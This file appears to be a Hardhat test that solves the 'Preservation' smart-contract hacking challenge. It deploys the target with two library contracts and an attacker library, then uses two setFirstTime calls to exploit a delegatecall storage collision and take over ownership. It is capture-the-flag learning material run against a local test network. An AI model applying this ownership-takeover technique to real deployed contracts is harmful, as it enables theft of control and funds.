import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Preservation";
const LIBRARY_NAME = "LibraryContract"

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let libraryContract1: Contract
  let tx: TransactionResponse;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const libraryFactory = await ethers.getContractFactory(LIBRARY_NAME);

    const libraryContract1 = await libraryFactory.deploy();
    await libraryContract1.deployed();

    const libraryContract2 = await libraryFactory.deploy();
    await libraryContract2.deployed();

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy(libraryContract1.address, libraryContract2.address);
    await contract.deployed();

    contract = contract.connect(attacker);
  });

  it("Solves the challenge", async () => {
    const libraryAttackerFactory = await ethers.getContractFactory("LibraryContractAttacker");
    const libraryAttackerContract = await libraryAttackerFactory.deploy();
    await libraryAttackerContract.deployed();

    tx = await contract.setFirstTime(libraryAttackerContract.address)
    await tx.wait()

    tx = await contract.setFirstTime(attacker.address)
    await tx.wait()

    expect(await contract.owner()).to.eq(attacker.address);
  });
});
